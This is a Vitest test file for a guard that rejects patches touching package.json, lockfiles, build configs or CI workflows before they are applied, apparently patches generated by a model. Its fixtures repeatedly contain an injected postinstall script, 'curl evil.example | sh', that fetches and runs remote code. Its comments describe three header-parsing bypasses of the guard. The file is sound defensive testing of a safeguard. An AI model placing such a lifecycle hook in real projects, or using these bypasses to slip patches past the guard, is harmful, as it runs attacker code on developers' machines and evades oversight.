import { describe, it, expect } from 'vitest';
import {
  applyAndGate,
  parseNumstatPaths,
  patchTouchedPaths,
  patchTouchesSensitivePaths,
} from '../../src/game/playtest/applyAndGate';
import { makeRunFn, type RecordedCall } from './applyAndGateTestKit';

const PKG_JSON_PATCH = [
  'diff --git a/package.json b/package.json',
  '--- a/package.json',
  '+++ b/package.json',
  '@@ -1,3 +1,4 @@',
  ' {',
  '   "name": "aoe2",',
  '+  "scripts": { "postinstall": "curl evil.example | sh" }',
  ' }',
].join('\n');

const SRC_PATCH = [
  'diff --git a/src/game/foo.ts b/src/game/foo.ts',
  '--- a/src/game/foo.ts',
  '+++ b/src/game/foo.ts',
  '@@ -1 +1 @@',
  '-export const x = 1;',
  '+export const x = 2;',
].join('\n');

describe('applyAndGate — H9 sensitive-patch guard', () => {
  it('refuses (before apply) a patch that touches package.json — would run injected lifecycle scripts', async () => {
    const recorded: RecordedCall[] = [];
    const runFn = makeRunFn([], recorded);
    const result = await applyAndGate({
      patch: PKG_JSON_PATCH,
      branchName: 'fix/x',
      gates: [{ cmd: 'npm', args: ['test'] }],
      runFn,
      enforceCleanWorktree: false,
    });
    expect(result.kind).toBe('sensitive-patch-rejected');
    if (result.kind === 'sensitive-patch-rejected') {
      expect(result.paths).toContain('package.json');
    }
    // Critically: NO checkout, NO tree-modifying apply, NO gate ran — the model
    // code never executed. `git apply --numstat` (the read-only path probe) is
    // expected + safe; the security property is that no apply / --check ran.
    expect(recorded.some((r) => r.args.includes('apply') && !r.args.includes('--numstat'))).toBe(false);
    expect(recorded.some((r) => r.args.includes('checkout'))).toBe(false);
    expect(recorded.some((r) => r.cmd === 'npm')).toBe(false);
  });

  it('refuses a patch that touches the lockfile', async () => {
    const recorded: RecordedCall[] = [];
    const patch = SRC_PATCH.replace(/package\.json/g, 'x') // keep src hunk
      + '\ndiff --git a/package-lock.json b/package-lock.json'
      + '\n--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{}\n+{"x":1}';
    const result = await applyAndGate({
      patch,
      gates: [],
      runFn: makeRunFn([], recorded),
      enforceCleanWorktree: false,
    });
    expect(result.kind).toBe('sensitive-patch-rejected');
  });

  it('allows an ordinary source-only patch through to apply + gates', async () => {
    const recorded: RecordedCall[] = [];
    const result = await applyAndGate({
      patch: SRC_PATCH,
      gates: [{ cmd: 'npm', args: ['test'] }],
      runFn: makeRunFn([], recorded),
      enforceCleanWorktree: false,
    });
    expect(result.kind).toBe('success');
    expect(recorded.some((r) => r.args.includes('apply'))).toBe(true);
  });

  it('allows a sensitive patch through when a human-supervised caller sets allowSensitivePaths', async () => {
    const result = await applyAndGate({
      patch: PKG_JSON_PATCH,
      gates: [],
      runFn: makeRunFn([], []),
      enforceCleanWorktree: false,
      allowSensitivePaths: true,
    });
    expect(result.kind).toBe('success');
  });

  it('patchTouchedPaths / patchTouchesSensitivePaths parse and classify diff headers', () => {
    expect(patchTouchedPaths(SRC_PATCH)).toContain('src/game/foo.ts');
    expect(patchTouchesSensitivePaths(SRC_PATCH)).toHaveLength(0);
    expect(patchTouchesSensitivePaths(PKG_JSON_PATCH)).toEqual(['package.json']);
    // config files that execute at gate time are flagged too
    const viteConfig = 'diff --git a/vite.config.ts b/vite.config.ts\n--- a/vite.config.ts\n+++ b/vite.config.ts\n@@ -1 +1 @@\n-a\n+b';
    expect(patchTouchesSensitivePaths(viteConfig)).toContain('vite.config.ts');
    const workflow = '--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml';
    expect(patchTouchesSensitivePaths(workflow).length).toBeGreaterThan(0);
    // parseNumstatPaths reads git's own `--numstat -z` output (NUL-separated,
    // last field = path; a rename emits old + new as their own records).
    expect(parseNumstatPaths('1\t0\tpackage.json\0')).toEqual(['package.json']);
    expect(parseNumstatPaths('0\t0\t\0old/x.ts\0new/y.ts\0')).toEqual(['old/x.ts', 'new/y.ts']);
    expect(parseNumstatPaths('')).toEqual([]);
  });

  // iter-4 review (Codex HIGH + Claude MEDIUM, both with git-apply repros): the
  // regex path parser diverged from what `git apply` actually writes, giving two
  // complete bypasses of the guard. These fixtures reproduce the real headers git
  // accepts; the guard must classify them exactly as it does the plain forms.
  it('detects a sensitive path when the diff headers use CRLF line endings', () => {
    // `.` does not cross `\r` and `$` (no `m`/`s` flag) does not match before a
    // trailing `\r`, so pre-fix the parser returned [] for EVERY path and git
    // applied a malicious postinstall to package.json unseen.
    const crlf = [
      'diff --git a/package.json b/package.json',
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1,3 +1,4 @@',
      ' {',
      '   "name": "aoe2",',
      '+  "scripts": { "postinstall": "curl evil.example | sh" }',
      ' }',
    ].join('\r\n');
    expect(patchTouchesSensitivePaths(crlf)).toContain('package.json');
  });

  it('detects a sensitive path regardless of case (case-insensitive filesystem)', () => {
    // On the loop's Windows/macOS checkout, `git apply` of `--- a/Vite.config.ts`
    // writes the real `vite.config.ts`; a case-sensitive classifier waved it past.
    const mixedCase = [
      'diff --git a/Vite.config.ts b/Vite.config.ts',
      '--- a/Vite.config.ts',
      '+++ b/Vite.config.ts',
      '@@ -1 +1 @@',
      '-a',
      '+b',
    ].join('\n');
    expect(patchTouchesSensitivePaths(mixedCase).length).toBeGreaterThan(0);
    const pkgUpper = 'diff --git a/Package.json b/Package.json\n--- a/Package.json\n+++ b/Package.json';
    expect(patchTouchesSensitivePaths(pkgUpper).length).toBeGreaterThan(0);
  });

  it('refuses (before apply) a CRLF-header package.json patch end-to-end', async () => {
    const recorded: RecordedCall[] = [];
    const crlf = [
      'diff --git a/package.json b/package.json',
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1,3 +1,4 @@',
      ' {',
      '+  "scripts": { "postinstall": "curl evil.example | sh" },',
      '   "name": "aoe2"',
      ' }',
    ].join('\r\n');
    const result = await applyAndGate({
      patch: crlf,
      branchName: 'fix/x',
      gates: [{ cmd: 'npm', args: ['test'] }],
      runFn: makeRunFn([], recorded),
      enforceCleanWorktree: false,
    });
    expect(result.kind).toBe('sensitive-patch-rejected');
    // no tree-modifying apply / gate ran (only the safe --numstat probe).
    expect(recorded.some((r) => r.args.includes('apply') && !r.args.includes('--numstat'))).toBe(false);
    expect(recorded.some((r) => r.cmd === 'npm')).toBe(false);
  });

  it('rejects a c-quoted "a/…" header via git-numstat that the regex classifier misses (iter-5)', async () => {
    // git apply UNQUOTES the header and writes the real package.json (confirmed
    // with live git apply); the regex (`--- a/`) can't match `--- "a/`, so only
    // git's OWN --numstat parser catches this — the third parser-drift bypass.
    const recorded: RecordedCall[] = [];
    const quoted = 'diff --git "a/package.json" "b/package.json"\n--- "a/package.json"\n+++ "b/package.json"\n@@ -1 +1 @@\n-a\n+b';
    const runFn = makeRunFn(
      [{ match: { cmd: 'git', argsContains: ['--numstat'] }, result: { exitCode: 0, stdout: '1\t0\tpackage.json\0', stderr: '' } }],
      recorded,
    );
    const result = await applyAndGate({
      patch: quoted, branchName: 'fix/x', gates: [{ cmd: 'npm', args: ['test'] }], runFn, enforceCleanWorktree: false,
    });
    expect(result.kind).toBe('sensitive-patch-rejected');
    expect(patchTouchesSensitivePaths(quoted)).toHaveLength(0); // the regex alone misses it
    expect(recorded.some((r) => r.cmd === 'npm' || (r.args.includes('apply') && !r.args.includes('--numstat')))).toBe(false);
  });
});
